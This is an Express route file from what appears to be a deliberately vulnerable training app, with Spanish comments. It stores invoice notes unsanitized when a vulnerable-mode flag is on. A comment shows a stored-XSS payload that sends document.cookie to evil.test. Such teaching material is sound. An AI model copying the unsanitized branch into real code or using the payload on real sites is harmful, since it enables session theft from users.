import { Router } from 'express';
import { db } from '../db/connection.js';
import { requireAuth } from '../middleware/auth.js';
import { isVulnerable } from '../config/env.js';
import { stripHtml } from '../utils/sanitize.js';

export const commentsRouter = Router();

/**
 * Vector 5 — Cross-Site Scripting (XSS almacenado), RIESGO MEDIO/ALTO.
 *
 * VULNERABLE: el cuerpo de la nota se guarda tal cual el cliente lo envió.
 * El frontend (InvoiceDetail.jsx) la renderiza con dangerouslySetInnerHTML,
 * así que una nota como
 *   <img src=x onerror="fetch('https://evil.test/steal?c='+document.cookie)">
 * ejecuta JavaScript en el navegador de cualquiera que abra la factura.
 *
 * PARCHEADA: stripHtml() escapa `<` y `>` antes de guardar, así que el
 * marcado queda neutralizado como texto literal sin importar cómo lo
 * renderice el cliente.
 */
commentsRouter.post('/invoices/:id/notes', requireAuth, (req, res) => {
  const invoiceId = Number(req.params.id);
  const { body } = req.body || {};
  if (!body || !body.trim()) return res.status(400).json({ error: 'La nota no puede estar vacía.' });

  const invoice = db.prepare('SELECT id, owner_id FROM invoices WHERE id = ?').get(invoiceId);
  if (!invoice) return res.status(404).json({ error: 'Factura no encontrada.' });

  const toStore = isVulnerable() ? body : stripHtml(body);

  const result = db
    .prepare('INSERT INTO invoice_notes (invoice_id, author_id, body) VALUES (?, ?, ?)')
    .run(invoiceId, req.user.id, toStore);

  const note = db
    .prepare(
      `SELECT invoice_notes.id, invoice_notes.body, invoice_notes.created_at, users.name AS author_name
       FROM invoice_notes JOIN users ON users.id = invoice_notes.author_id
       WHERE invoice_notes.id = ?`
    )
    .get(result.lastInsertRowid);

  res.status(201).json({ note });
});
